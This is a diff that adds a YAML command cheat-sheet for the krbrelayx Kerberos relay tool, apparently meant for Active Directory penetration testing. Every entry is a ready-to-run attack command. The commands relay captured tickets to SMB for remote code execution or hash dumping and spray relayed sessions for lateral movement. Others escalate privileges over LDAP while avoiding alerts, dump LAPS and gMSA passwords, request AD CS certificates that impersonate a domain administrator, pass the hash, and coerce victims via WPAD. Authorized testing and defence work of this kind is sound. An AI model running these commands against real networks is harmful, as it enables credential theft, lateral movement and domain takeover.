@@ -1,0 +1,109 @@
+tool: krbrelayx
+tags: [active-directory, pentest, kerberos, relay, delegation, impacket]
+
+actions:
+# === BASIC RELAY ===
+ - title: krbrelayx - store tickets only
+   desc: |
+     Listens for Kerberos authentication without a target, storing captured tickets for later use.
+     Safe starting point to collect tickets before deciding on an attack path.
+   command: "krbrelayx.py"
+
+ - title: krbrelayx - relay to smb target
+   desc: |
+     Relays captured Kerberos AP-REQ to an SMB target for command execution or hash dumping.
+     Target must be a hostname since Kerberos relies on SPNs, not raw IPs.
+   command: "krbrelayx.py -t smb://{{target_host}}"
+
+ - title: krbrelayx - relay to target list file
+   desc: |
+     Relays to multiple targets listed one per line in a file.
+     Use to spray relayed sessions across a subnet for lateral movement.
+   command: "krbrelayx.py -tf {{targets_file}}"
+
+ - title: krbrelayx - smb exec command
+   desc: |
+     Executes a command on the relayed SMB target instead of dumping hashes.
+     Use for direct code execution once a privileged session is relayed.
+   command: "krbrelayx.py -t smb://{{target_host}} -c {{command|whoami}}"
+
+ - title: krbrelayx - smb exec file
+   desc: |
+     Executes a script file on the relayed target via SMB.
+     Handy when the payload is too long for a single -c command string.
+   command: "krbrelayx.py -t smb://{{target_host}} -e {{script_file}}"
+
+ - title: krbrelayx - enum local admins
+   desc: |
+     Attempts SAMR lookup to enumerate local admins when the relayed user is not admin.
+     Only works against pre-Win10 Anniversary targets.
+   command: "krbrelayx.py -t smb://{{target_host}} --enum-local-admins"
+
+# === LDAP / PRIVESC ===
+ - title: krbrelayx - ldap no dump
+   desc: |
+     Relays to LDAP while skipping the information dump phase.
+     Speeds up the attack when only privesc actions are needed.
+   command: "krbrelayx.py -t ldap://{{dc_host}} --no-dump"
+
+ - title: krbrelayx - escalate user
+   desc: |
+     Escalates privileges of an existing user via ACL attack on relay.
+     Use when creating new users would trigger alerts.
+   command: "krbrelayx.py -t ldap://{{dc_host}} --escalate-user {{target_user}}"
+
+ - title: krbrelayx - add computer account
+   desc: |
+     Adds a new computer account through the relayed LDAP session.
+     Foundation step for Resource-Based Constrained Delegation attacks.
+   command: "krbrelayx.py -t ldap://{{dc_host}} --add-computer {{computer_name|NEWCOMP$}}"
+
+ - title: krbrelayx - delegate access
+   desc: |
+     Grants the attacker's account delegation rights on the relayed computer object.
+     Enables impersonation of any user to that target afterwards.
+   command: "krbrelayx.py -t ldap://{{dc_host}} --delegate-access --escalate-user {{attacker_user}}"
+
+ - title: krbrelayx - dump laps and gmsa
+   desc: |
+     Dumps readable LAPS and gMSA passwords via the relayed LDAP session.
+     High-value loot often yielding local admin or service credentials.
+   command: "krbrelayx.py -t ldap://{{dc_host}} --dump-laps --dump-gmsa"
+
+ - title: krbrelayx - dump adcs info
+   desc: |
+     Dumps AD CS enrollment services and certificate template info.
+     Recon step before launching ESC-based certificate attacks.
+   command: "krbrelayx.py -t ldap://{{dc_host}} --dump-adcs"
+
+# === AD CS RELAY ===
+ - title: krbrelayx - adcs relay with template
+   desc: |
+     Relays to an AD CS endpoint to request a certificate with the given template.
+     Use Machine/User templates matching the relayed account type, DomainController for DCs.
+   command: "krbrelayx.py -t https://{{ca_host}}/certsrv/certfnsh.asp --adcs --template {{template|Machine}}"
+
+ - title: krbrelayx - adcs relay esc1 altname
+   desc: |
+     Performs ESC1/ESC6 by embedding a Subject Alternative Name in the request.
+     The UPN altname lets you impersonate a domain admin from a low-priv relay.
+   command: "krbrelayx.py -t https://{{ca_host}}/certsrv/certfnsh.asp --adcs --template {{template|User}} --altname {{alt_upn|administrator@domain.local}} -v {{victim|targetuser}}"
+
+# === AUTH / NETWORK ===
+ - title: krbrelayx - unconstrained delegation keys
+   desc: |
+     Supplies your unconstrained-delegation account password for ticket decryption.
+     Required when relaying sessions that need your account's Kerberos keys.
+   command: "krbrelayx.py -t smb://{{target_host}} -s {{username}} -p {{password}} -dc-ip {{dc_ip}}"
+
+ - title: krbrelayx - pass the hash with aes key
+   desc: |
+     Authenticates with NTLM hashes or AES key instead of a password.
+     Use when only hashes were recovered from a prior compromise.
+   command: "krbrelayx.py -t smb://{{target_host}} --hashes {{lm_hash|aad3b435b51404eeaad3b435b51404ee}}:{{nt_hash}} -aesKey {{aes_key}} -dc-ip {{dc_ip}}"
+
+ - title: krbrelayx - wpad proxy attack
+   desc: |
+     Serves a WPAD file to coerce proxy authentication from victims.
+     Pair with interface IP so victims route traffic through your relay.
+   command: "krbrelayx.py -t smb://{{target_host}} -wh {{proxy_host|attacker-ip}} -ip {{interface_ip}}"
